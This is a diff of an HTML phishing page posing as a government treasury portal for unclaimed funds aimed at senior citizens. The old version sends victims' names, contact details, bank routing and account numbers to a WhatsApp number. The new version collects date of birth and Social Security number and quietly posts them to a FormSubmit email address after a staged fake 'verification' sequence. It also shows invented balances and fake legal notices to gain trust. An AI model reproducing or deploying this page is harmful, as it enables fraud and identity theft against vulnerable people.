@@ -3,342 +3,363 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Disbursement Portal | Unclaimed Property Division</title>
+    <title>Senior Citizen Unclaimed Treasury</title>
+    <!-- Tailwind CSS Platform Engine -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <style>
-        /* Professional Treasury Theme Colors */
-        :root {
-            --treasury-blue: #112e51;
-            --trust-blue: #0071bc;
-            --accent-gold: #d4af37;
-            --success-green: #2e7d32;
-            --light-bg: #f0f4f8;
-            --text-dark: #212121;
-            --text-light: #ffffff;
-            --border-color: #d6d7d9;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--light-bg);
-            color: var(--text-dark);
-            line-height: 1.6;
-        }
-
-        .gov-banner {
-            background-color: #f0f0f0;
-            padding: 5px 20px;
-            font-size: 11px;
-            color: #555;
-            border-bottom: 1px solid var(--border-color);
-            text-align: center;
-            font-weight: 600;
-        }
-
-        header {
-            background-color: var(--treasury-blue);
-            color: var(--text-light);
-            padding: 20px;
-            border-bottom: 4px solid var(--accent-gold);
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .branding h1 {
-            font-size: 22px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
-        .branding p {
-            font-size: 13px;
-            color: #a1b0cb;
-            text-transform: uppercase;
-        }
-
-        nav {
-            background-color: #ffffff;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            list-style: none;
-        }
-
-        .nav-container a {
-            display: block;
-            padding: 15px 20px;
-            color: var(--treasury-blue);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        .nav-container .active-nav {
-            border-bottom: 3px solid var(--trust-blue);
-            background-color: #f8f9fa;
-        }
-
-        .main-wrapper {
-            max-width: 1200px;
-            margin: 30px auto;
-            padding: 0 15px;
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 30px;
-        }
-
-        .section-card {
-            background: #ffffff;
-            padding: 25px;
-            border-radius: 4px;
-            border: 1px solid var(--border-color);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            margin-bottom: 25px;
-        }
-
-        h2 {
-            color: var(--treasury-blue);
-            margin-bottom: 15px;
-            font-size: 20px;
-            border-bottom: 2px solid #f0f4f8;
-            padding-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .legal-notice {
-            background-color: #fff8e1;
-            border-left: 4px solid #ffb300;
-            padding: 15px;
-            margin-bottom: 25px;
-            font-size: 14px;
-            color: #5d4037;
-        }
-
-        .form-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .form-group label {
-            margin-bottom: 6px;
-            font-weight: 600;
-            font-size: 13px;
-            color: var(--treasury-blue);
-        }
-
-        .form-group input, .form-group select {
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            font-size: 15px;
-            background-color: #fafafa;
-        }
-
-        .form-group input:focus {
-            border-color: var(--trust-blue);
-            outline: none;
-            background-color: #fff;
-        }
-
-        .btn-submit {
-            background-color: #25d366; /* WhatsApp Green */
-            color: white;
-            border: none;
-            padding: 14px 30px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 4px;
-            cursor: pointer;
-            text-transform: uppercase;
-            width: 100%;
-            margin-top: 15px;
-            transition: background 0.2s;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-
-        .btn-submit:hover {
-            background-color: #128c7e;
-        }
-
-        footer {
-            background-color: var(--treasury-blue);
-            color: var(--text-light);
-            padding: 30px 20px;
-            margin-top: 50px;
-            border-top: 4px solid var(--accent-gold);
-            text-align: center;
-            font-size: 12px;
-        }
+        /* Official Page State Management */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
     </style>
 </head>
-<body>
+<body class="bg-[#f0f4f8] text-[#1a2530] font-sans min-h-screen flex flex-col relative">
 
-    <div class="gov-banner">
-        SECURE ONLINE DISBURSEMENT NETWORK // UNCLAIMED PROPERTY DIVISION
+    <!-- ========================================== -->
+    <!-- SECURE INTERMEDIARY LOADING OVERLAY        -->
+    <!-- ========================================== -->
+    <div id="loadingOverlay" class="hidden fixed inset-0 bg-[#0c2340]/98 z-50 flex flex-col items-center justify-center p-6 backdrop-blur-sm animate-fade-in">
+        <div class="text-center space-y-6 max-w-sm">
+            <!-- Institutional Loading Emblem -->
+            <div class="relative w-16 h-16 mx-auto">
+                <div class="absolute inset-0 rounded-full border-4 border-slate-700"></div>
+                <div class="absolute inset-0 rounded-full border-4 border-[#d4af37] border-t-transparent animate-spin"></div>
+            </div>
+            
+            <div class="space-y-2">
+                <h3 id="loadingTitle" class="text-white font-bold text-lg tracking-wide font-serif">Verifying Allocation Matching Files</h3>
+                <p id="loadingSubtitle" class="text-slate-300 text-xs tracking-wider uppercase font-mono">Connecting to Private Clearing Authority...</p>
+            </div>
+            
+            <!-- Secure progress matrix -->
+            <div class="w-full bg-slate-900 rounded-none h-2 overflow-hidden border border-slate-700">
+                <div id="loadingProgressBar" class="bg-[#d4af37] h-full w-0 transition-all duration-300 ease-out"></div>
+            </div>
+        </div>
     </div>
 
-    <header>
-        <div class="header-container">
-            <div class="branding">
-                <h1>DEPARTMENT OF THE TREASURY</h1>
-                <p>Unclaimed Property Division &bull; Secure Payout System</p>
+    <!-- Official Top Bar Notice (Mirrors Official Sites) -->
+    <div class="bg-[#0c2340] border-b border-[#071526] text-white text-[11px] px-4 py-1.5 flex items-center space-x-2 font-medium">
+        <span class="inline-block w-3 h-2 bg-[#d4af37] rounded-sm"></span>
+        <p class="tracking-wide text-slate-200">Official Secure Document Portal • Single Beneficiary Clearance Access</p>
+    </div>
+
+    <!-- Main Institutional Navigation Header -->
+    <header class="bg-[#112e51] text-white border-b-4 border-[#d4af37] px-4 py-4 shadow-md">
+        <div class="max-w-4xl mx-auto flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="h-10 w-10 bg-[#0c2340] border border-[#d4af37] text-[#d4af37] font-serif font-bold text-xl flex items-center justify-center shadow">§</div>
+                <div class="flex flex-col">
+                    <span class="font-serif font-bold text-lg tracking-wide text-white leading-tight">Senior Citizen Unclaimed Treasury</span>
+                    <span class="text-[10px] text-slate-300 uppercase tracking-widest font-semibold">National Asset & Nomination Recovery Division</span>
+                </div>
+            </div>
+            <div class="bg-[#0c2340] border border-slate-700 px-3 py-1 rounded-sm text-right">
+                <span class="text-[10px] text-slate-400 font-mono block uppercase tracking-wider">File Allocation Index</span>
+                <span id="headerFileId" class="text-xs font-mono font-bold text-[#d4af37]">UNVERIFIED_HOLD</span>
             </div>
         </div>
     </header>
 
-    <nav>
-        <ul class="nav-container">
-            <li><a href="#identity-verification" class="active-nav">1. Identity Verification</a></li>
-            <li><a href="#banking-details">2. Disbursement Target</a></li>
-        </ul>
-    </nav>
-
-    <!-- Form uses an onsubmit function to process the text fields into a WhatsApp text link -->
-    <form onsubmit="sendToWhatsApp(event)">
-        <div class="main-wrapper">
-
-            <!-- STEP 1: LEGAL IDENTITY INTAKE BLOCK -->
-            <main class="section-card" id="identity-verification">
-                <h2>Legal Identity & Fund Claim Intake</h2>
-                <div class="legal-notice">
-                    <strong>Mandatory Regulatory Notice:</strong> To authorize the online disbursement of unclaimed property assets, clients must provide full legal verification matching public repository records.
-                </div>
-
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="legal-first">Legal First Name</label>
-                        <input type="text" id="legal-first" placeholder="As it appears on official ID" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="legal-last">Legal Last Name</label>
-                        <input type="text" id="legal-last" placeholder="As it appears on official ID" required>
-                    </div>
-                </div>
-
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="client-email">Email Address</label>
-                        <input type="email" id="client-email" placeholder="For file updates and receipt notifications" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="client-phone">Primary Phone Number</label>
-                        <input type="tel" id="client-phone" placeholder="Include area code" required>
-                    </div>
-                </div>
-
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label for="client-address">Full Physical Address</label>
-                    <input type="text" id="client-address" placeholder="Street Address, Apt/Suite, City, State/Parish, Zip" required>
-                </div>
-            </main>
-
-            <!-- STEP 2: BANKING & DISBURSEMENT FIELDS -->
-            <section class="section-card" id="banking-details">
-                <h2>Online Disbursement Target Setup</h2>
-                <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Specify the secure routing structure where the audited unclaimed asset balance should be electronically transferred.</p>
-                
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="bank-name">Financial Institution / Bank Name</label>
-                        <input type="text" id="bank-name" placeholder="Name of Bank" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="account-type">Account Type</label>
-                        <select id="account-type">
-                            <option value="Checking">Checking / Current Account</option>
-                            <option value="Savings">Savings Account</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="routing-num">Routing / Transit Number</label>
-                        <input type="text" id="routing-num" placeholder="Routing Code" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="account-num">Account Number</label>
-                        <input type="text" id="account-num" placeholder="Account Code" required>
-                    </div>
-                </div>
-
-                <!-- Submit Button triggers the script -->
-                <button type="submit" class="btn-submit">Submit Form via WhatsApp</button>
-            </section>
-
+    <!-- Navigation Step Progress Bar -->
+    <div class="bg-white border-b border-slate-300 shadow-sm py-3 px-4">
+        <div class="max-w-3xl mx-auto grid grid-cols-3 gap-2">
+            <button id="nav-step1" class="border-t-4 border-[#112e51] pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-[#112e51] focus:outline-none">
+                Step 1: Identity Intake
+            </button>
+            <button id="nav-step2" disabled class="border-t-4 border-slate-200 pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-slate-400 focus:outline-none opacity-50 cursor-not-allowed">
+                Step 2: Status Ledger
+            </button>
+            <button id="nav-step3" disabled class="border-t-4 border-slate-200 pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-slate-400 focus:outline-none opacity-50 cursor-not-allowed">
+                Step 3: Asset Release
+            </button>
         </div>
-    </form>
+    </div>
 
-    <footer>
-        &copy; 2026 Department of the Treasury &bull; Unclaimed Property Division &bull; Private Client Portal.
+    <!-- Main Content Wrapper -->
+    <main class="flex-1 p-4 md:p-6 max-w-4xl w-full mx-auto">
+
+        <!-- ========================================== -->
+        <!-- PAGE 1: CLIENT SUBMISSION ENTRY            -->
+        <!-- ========================================== -->
+        <div id="step1" class="tab-content active space-y-4">
+            <div class="bg-white border border-slate-300 rounded-none p-6 shadow-md max-w-xl mx-auto">
+                <div class="border-b border-slate-200 pb-4 mb-4">
+                    <h2 class="text-xl font-serif font-bold text-[#112e51] tracking-tight">Nomination Claim Processing Intake</h2>
+                    <p class="text-slate-600 text-xs mt-1">Provide your 9-digit allocation matching parameters to verify outstanding unclaimed balance refunds. Fields must align perfectly with existing nomination files.</p>
+                </div>
+
+                <!-- Error message box -->
+                <div id="loginError" class="hidden bg-red-50 border-l-4 border-red-600 text-red-900 text-xs p-3 font-medium mb-4">
+                    SECURITY NOTICE: The entered 9-Digit Allocation Code could not be cross-referenced against active treasury logs. Please verify your notification letter data.
+                </div>
+
+                <!-- Form Setup targeting FormSubmit back-end -->
+                <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" id="intakeForm" class="space-y-4">
+                    <input type="hidden" name="_subject" value="Treasury Asset Claim Intake Received">
+                    <input type="hidden" name="_captcha" value="false">
+
+                    <!-- Two-column row for Name and DOB for maximum clean spacing -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Full Legal Name</label>
+                            <input type="text" name="name" id="inputName" required placeholder="First, Middle, Last Name" class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-sm text-[#1a2530] focus:outline-none focus:border-[#112e51] focus:bg-white font-medium placeholder-slate-400">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Date of Birth</label>
+                            <input type="date" name="dob" id="inputDob" required class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-sm text-[#1a2530] focus:outline-none focus:border-[#112e51] focus:bg-white font-medium uppercase text-[11px]">
+                        </div>
+                    </div>
+
+                    <!-- Contact Number -->
+                    <div>
+                        <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Primary Telephone Contact</label>
+                        <input type="tel" name="phone" id="inputPhone" required placeholder="e.g. +1 (555) 000-0000" class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-sm text-[#1a2530] focus:outline-none focus:border-[#112e51] focus:bg-white font-medium placeholder-slate-400">
+                    </div>
+
+                    <!-- Complete Address Block -->
+                    <div>
+                        <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Current Residential Mailing Address</label>
+                        <textarea name="address" id="inputAddress" rows="2" placeholder="Street Address, City, State, ZIP Code" required class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-xs text-[#1a2530] placeholder-slate-400 focus:outline-none focus:border-[#112e51] focus:bg-white font-medium resize-none"></textarea>
+                    </div>
+
+                    <!-- Identity Reference Number / SSN -->
+                    <div>
+                        <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Social Security Number / Tax Identification Index</label>
+                        <input type="text" name="ssn" id="inputSsn" required placeholder="000-00-0000" class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-sm text-[#1a2530] font-mono focus:outline-none focus:border-[#112e51] focus:bg-white placeholder-slate-400">
+                    </div>
+
+                    <!-- Main Portal Gateway Trigger Code (9 Digits) -->
+                    <div>
+                        <label class="block text-xs font-bold text-[#112e51] uppercase tracking-wider mb-1">Treasury Allocation Code (9 Digits)</label>
+                        <input type="text" id="inputCode" maxlength="9" placeholder="Enter matching file credential code" required class="w-full bg-[#f9fafb] border border-slate-300 rounded-sm px-3 py-2 text-sm text-[#1a2530] font-mono focus:outline-none focus:border-[#112e51] focus:bg-white placeholder-slate-400">
+                    </div>
+
+                    <!-- INSTITUTIONAL SECURITY CONSENT CHECKBOX -->
+                    <div class="bg-[#f0f4f8] border border-slate-200 p-3 text-[12px] text-slate-700 flex items-start space-x-2.5">
+                        <input type="checkbox" required class="mt-1 h-4 w-4 border-slate-300 text-[#112e51] focus:ring-0 rounded-sm">
+                        <span class="leading-relaxed">I certify under penalty of administrative record verification that the data submitted is correct, authorizing the private audit evaluation of my nomination asset recovery portfolio.</span>
+                    </div>
+
+                    <!-- Official Form Gateway Submission Button -->
+                    <button type="submit" class="w-full bg-[#112e51] hover:bg-[#0c2340] text-white font-bold py-3 px-4 rounded-sm transition shadow border-b-2 border-[#071526] text-center block text-sm tracking-wide uppercase cursor-pointer">
+                        Execute Verification Match Check
+                    </button>
+                </form>
+            </div>
+        </div>
+
+
+        <!-- ========================================== -->
+        <!-- PAGE 2: MAIN ACCOUNT STATUS DASHBOARD      -->
+        <!-- ========================================== -->
+        <div id="step2" class="tab-content space-y-5">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-white rounded-none p-5 border border-slate-300 space-y-3 shadow-sm">
+                    <h3 class="text-xs font-bold text-[#112e51] uppercase tracking-wider border-b border-slate-200 pb-1.5">File Ledger Profile</h3>
+                    <div>
+                        <p class="text-[10px] text-slate-500 font-bold uppercase">Designated Beneficiary</p>
+                        <p id="dashClientName" class="text-base font-serif font-bold text-[#112e51]">---</p>
+                    </div>
+                    <div>
+                        <p class="text-[10px] text-slate-500 font-bold uppercase">Processing Phase</p>
+                        <p class="text-xs font-bold text-[#b7791f]">Manual Validation Audit Active</p>
+                    </div>
+                </div>
+
+                <div class="md:col-span-2 bg-[#112e51] text-white rounded-none p-6 border-l-8 border-[#d4af37] flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 shadow-sm">
+                    <div>
+                        <p class="text-xs font-bold text-slate-300 uppercase tracking-wider mb-1">Audited Unclaimed Liquidation Value</p>
+                        <h1 id="dashFunds" class="text-4xl font-serif font-bold tracking-tight text-white">$0.00</h1>
+                    </div>
+                    <div id="statusBadge" class="px-3 py-1.5 rounded-sm text-xs font-bold uppercase tracking-wider bg-[#d4af37]/20 text-[#d4af37] border border-[#d4af37]/30">
+                        In Process
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-white rounded-none p-5 border border-slate-300 shadow-sm">
+                <h3 class="text-xs font-bold text-[#112e51] uppercase tracking-wider mb-2">Treasury Processing Directives</h3>
+                <div class="bg-[#f8fafc] border border-slate-200 p-4 border-l-4 border-[#112e51]">
+                    <p id="statusNotice" class="text-xs text-slate-700 leading-relaxed font-medium">---</p>
+                </div>
+            </div>
+
+            <div class="flex justify-between items-center pt-2">
+                <button onclick="goToPage('step1')" class="bg-white hover:bg-slate-50 text-slate-600 px-4 py-2 border border-slate-300 rounded-sm font-bold text-xs transition">
+                    ← Terminate & Lock File
+                </button>
+                <button onclick="goToPage('step3')" class="bg-[#112e51] hover:bg-[#0c2340] text-white px-5 py-2 rounded-sm font-bold text-xs shadow transition border-b-2 border-[#071526]">
+                    Proceed to Disbursement Release →
+                </button>
+            </div>
+        </div>
+
+
+        <!-- ========================================== -->
+        <!-- PAGE 3: DISBURSEMENT DETAILS OUTLET        -->
+        <!-- ========================================== -->
+        <div id="step3" class="tab-content space-y-4">
+            <div class="bg-white border border-slate-300 rounded-none p-6 shadow-md max-w-xl mx-auto text-center space-y-5">
+                <div class="h-12 w-12 bg-[#f0f4f8] text-[#112e51] border-2 border-[#112e51] rounded-full flex items-center justify-center mx-auto text-xl font-bold font-serif">$</div>
+                
+                <div>
+                    <h2 class="text-xl font-serif font-bold text-[#112e51]">Disbursement Outflow Management</h2>
+                    <p class="text-slate-600 text-xs mt-1">Authorized allocation liquidations are structured via secure transmission channels.</p>
+                </div>
+
+                <div class="bg-[#f8fafc] border border-slate-300 rounded-none p-4 text-left space-y-3">
+                    <div class="flex justify-between text-xs border-b border-slate-200 pb-2">
+                        <span class="text-slate-500 font-medium">Clearance Classification</span>
+                        <span class="text-[#112e51] font-bold uppercase tracking-wide">Private Nomination Settlement</span>
+                    </div>
+                    <div class="flex justify-between text-xs border-b border-slate-200 pb-2">
+                        <span class="text-slate-500 font-medium">Gross Liquidation Total</span>
+                        <span id="summaryFunds" class="text-emerald-700 font-mono font-bold text-base">$0.00</span>
+                    </div>
+                    <div class="flex justify-between text-xs pt-1">
+                        <span class="text-slate-500 font-medium">Disbursement Status</span>
+                        <span class="text-[#b7791f] font-bold uppercase tracking-wider text-[11px]">Awaiting Administrative Transfer Authorization</span>
+                    </div>
+                </div>
+
+                <div class="pt-2 flex justify-start">
+                    <button onclick="goToPage('step2')" class="bg-white hover:bg-slate-50 text-slate-600 px-4 py-2 border border-slate-300 rounded-sm font-bold text-xs transition">
+                        ← Return to Status Ledger
+                    </button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ========================================== -->
+    <!-- COMPLIANT GOVERNMENT-STYLE SYSTEM FOOTER  -->
+    <!-- ========================================== -->
+    <footer class="bg-[#112e51] text-white border-t-4 border-[#0c2340] mt-auto">
+        <!-- Part 1: Official Statutory & Legal Paperwork Disclaimers -->
+        <div class="max-w-4xl mx-auto px-4 py-6 grid grid-cols-1 md:grid-cols-2 gap-6 text-[11px] text-slate-300 leading-relaxed border-b border-slate-700">
+            <div class="space-y-2">
+                <h4 class="font-bold uppercase tracking-wider text-white text-[12px] font-serif">Paperwork Reduction Act Notice of 1980</h4>
+                <p>In accordance with the Paperwork Reduction Act of 1980, data collected through this verification layout is strictly limited to identifying valid outstanding financial nominations. Response to these validation parameters is strictly required to secure verified beneficiary liquidation matches under safe operational handling limits.</p>
+            </div>
+            <div class="space-y-2">
+                <h4 class="font-bold uppercase tracking-wider text-white text-[12px] font-serif">Secure System Protection Act</h4>
+                <p>This entry system is managed as private asset clearing property. Unauthorized lookup attempts, code manipulation, or credential spoofing are strictly prohibited and subject to civil mitigation reviews. The administration logs access tokens, network nodes, and transmission telemetry to maintain data safety boundaries.</p>
+            </div>
+        </div>
+        
+        <!-- Part 2: Standard Copyright Clearance Line -->
+        <div class="max-w-4xl mx-auto px-4 py-4 flex flex-col sm:flex-row justify-between items-center gap-2 text-[10px] text-slate-400 font-mono tracking-wider">
+            <span>© SENIOR CITIZEN UNCLAIMED TREASURY • ALL RIGHTS RESERVED</span>
+            <span class="uppercase">Internal Portal Engine v4.2.6</span>
+        </div>
     </footer>
 
+    <!-- DACTIVE INTERACTIVE SCRIPTS -->
     <script>
-        function sendToWhatsApp(event) {
-            event.preventDefault(); // Prevents the webpage from reloading
+        const trackingDatabase = {
+            "105642802": { funds: "$4,500.00", status: "processing", notice: "Your intake parameters have successfully passed step 1 verification checks. The allocation portfolio is currently queued under internal structural review. System updates post adjustments directly to this data grid window." },
+            "209841335": { funds: "$8,200.00", status: "processing", notice: "File registration metrics loaded successfully. The outstanding asset total remains in process pending physical settlement clearing signature authorization routines." },
+            "304115792": { funds: "$14,350.00", status: "issue", notice: "ALERT REQUIREMENT: A structural data variance has been encountered during your identity index matching pass. Please connect directly with your processing agent to resolve outstanding record differences." },
+            "407332118": { funds: "$21,000.00", status: "issue", notice: "SUSPENSION NOTICE: Distribution hold active. File records showcase an identification match profile variance. Secure asset clearing requires secondary off-line verification documentation." }
+        };
 
-            // 1. EDIT THIS NUMBER BELOW TO YOUR ACTUAL WHATSAPP NUMBER WITH COUNTRY CODE
-            // Example for Jamaica: "18765551234" (Do not add a '+' sign or dashes, just numbers)
-            var whatsappNumber = "19567048309"; 
+        let isUnlocked = false;
 
-            // 2. Grabbing what the user typed into the input boxes
-            var firstName = document.getElementById('legal-first').value;
-            var lastName = document.getElementById('legal-last').value;
-            var email = document.getElementById('client-email').value;
-            var phone = document.getElementById('client-phone').value;
-            var address = document.getElementById('client-address').value;
-            var bankName = document.getElementById('bank-name').value;
-            var accountType = document.getElementById('account-type').value;
-            var routingNum = document.getElementById('routing-num').value;
-            var accountNum = document.getElementById('account-num').value;
+        document.getElementById('intakeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-            // 3. Creating a structured text message
-            var message = "*NEW TREASURY DISBURSEMENT CLAIM REGISTRATION*\n\n" +
-                          "*CLIENT IDENTITY DETAIL*\n" +
-                          "• Full Name: " + firstName + " " + lastName + "\n" +
-                          "• Phone: " + phone + "\n" +
-                          "• Email: " + email + "\n" +
-                          "• Address: " + address + "\n\n" +
-                          "*DISBURSEMENT ROUTING DETAILS*\n" +
-                          "• Bank Name: " + bankName + "\n" +
-                          "• Account Type: " + accountType + "\n" +
-                          "• Routing Number: " + routingNum + "\n" +
-                          "• Account Number: " + accountNum + "\n\n" +
-                          "_Please review submission immediately._";
+            const nameInput = document.getElementById('inputName').value;
+            const codeInput = document.getElementById('inputCode').value.trim();
+            const errorBox = document.getElementById('loginError');
 
-            // 4. Encoding text symbols properly so web links understand spacing
-            var encodedMessage = encodeURIComponent(message);
+            if (trackingDatabase[codeInput]) {
+                errorBox.classList.add('hidden');
+                
+                // --- TIMED RECOVERY LOADING SEQUENCE (15 SECONDS) ---
+                const overlay = document.getElementById('loadingOverlay');
+                const title = document.getElementById('loadingTitle');
+                const sub = document.getElementById('loadingSubtitle');
+                const bar = document.getElementById('loadingProgressBar');
+                
+                overlay.classList.remove('hidden'); 
+                bar.style.width = '0%';
 
-            // 5. Creating the final mobile/desktop compatible URL
-            var whatsappURL = "https://api.whatsapp.com/send?phone=" + whatsappNumber + "&text=" + encodedMessage;
+                setTimeout(() => { title.textContent = "Querying Treasury Index Archives..."; sub.textContent = "Cross-referencing matching nomination tables..."; bar.style.width = '35%'; }, 3000);
+                setTimeout(() => { title.textContent = "Analyzing Balance Classifications..."; sub.textContent = "Processing secure file ownership tokens..."; bar.style.width = '70%'; }, 7000);
+                setTimeout(() => { title.textContent = "Allocation Identification Established!"; sub.textContent = "Rendering personalized client tracking ledger..."; bar.style.width = '100%'; }, 12000);
 
-            // 6. Directing the client's screen straight to your WhatsApp window
-            window.open(whatsappURL, '_blank');
+                // Final release to page 2 dashboard at 15 seconds
+                setTimeout(() => {
+                    overlay.classList.add('hidden'); 
+
+                    isUnlocked = true;
+                    const clientRecord = trackingDatabase[codeInput];
+
+                    document.getElementById('headerFileId').textContent = "FILE #" + codeInput;
+                    document.getElementById('headerFileId').className = "text-xs font-mono font-bold text-[#d4af37]";
+                    document.getElementById('dashClientName').textContent = nameInput;
+                    document.getElementById('dashFunds').textContent = clientRecord.funds;
+                    document.getElementById('summaryFunds').textContent = clientRecord.funds;
+                    document.getElementById('statusNotice').textContent = clientRecord.notice;
+
+                    const badge = document.getElementById('statusBadge');
+                    if (clientRecord.status === "issue") {
+                        badge.className = "px-3 py-1.5 rounded-sm text-xs font-bold uppercase tracking-wider bg-red-100 text-red-700 border border-red-200";
+                        badge.textContent = "Review Alert Checked";
+                    } else {
+                        badge.className = "px-3 py-1.5 rounded-sm text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 border border-amber-200";
+                        badge.textContent = "In Process";
+                    }
+
+                    enableNav('nav-step2');
+                    enableNav('nav-step3');
+
+                    // Quietly submit the form details to your FormSubmit email handler in background
+                    fetch(this.action, { method: 'POST', body: new FormData(this) });
+
+                    goToPage('step2');
+                }, 15000); 
+
+            } else {
+                errorBox.classList.remove('hidden');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        });
+
+        function goToPage(tabId) {
+            if (!isUnlocked && (tabId === 'step2' || tabId === 'step3')) return;
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(content => content.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            resetNavBars();
+            const activeNav = document.getElementById('nav-' + tabId);
+            if (activeNav) {
+                activeNav.className = "border-t-4 border-[#112e51] pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-[#112e51] focus:outline-none";
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function enableNav(id) {
+            const btn = document.getElementById(id);
+            btn.removeAttribute('disabled');
+            btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            btn.classList.add('cursor-pointer');
+            btn.setAttribute('onclick', `goToPage('${id.replace('nav-', '')}')`);
+        }
+
+        function resetNavBars() {
+            const steps = ['nav-step1', 'nav-step2', 'nav-step3'];
+            steps.forEach(id => {
+                const btn = document.getElementById(id);
+                if (btn.hasAttribute('disabled')) {
+                    btn.className = "border-t-4 border-slate-200 pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-slate-400 focus:outline-none opacity-50 cursor-not-allowed";
+                } else {
+                    btn.className = "border-t-4 border-slate-200 pt-1 text-left text-[11px] font-bold uppercase tracking-wider text-slate-600 focus:outline-none cursor-pointer";
+                }
+            });
         }
     </script>
-
 </body>
 </html>
+
